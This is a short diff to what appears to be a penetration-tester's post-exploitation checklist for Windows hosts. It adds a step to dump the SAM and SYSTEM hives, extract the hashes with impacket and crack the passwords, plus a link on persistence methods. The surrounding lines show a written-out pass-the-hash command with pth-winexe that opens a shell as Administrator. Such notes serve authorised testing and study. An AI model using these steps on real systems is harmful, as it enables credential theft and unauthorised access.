@@ -425,12 +425,16 @@ metasploit tfp server module on Kali
 ____ 
 # Post Exploitation  
 ## Checklist
-Dual home:
+Check to see if device is dual home:
 
     ipconfig /all
     arp -a
-    route print 
-## Access
+    route print    
+Dump SAM and SYSTEM, then extract hashes with impacket scripts. Crack passwords.    
+## Access 
+### Persistence Methods   
+https://persistence-info.github.io/   
+
 ### Pass the Hash with winexe
 
     pth-winexe //192.168.149.10 -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e cmd   
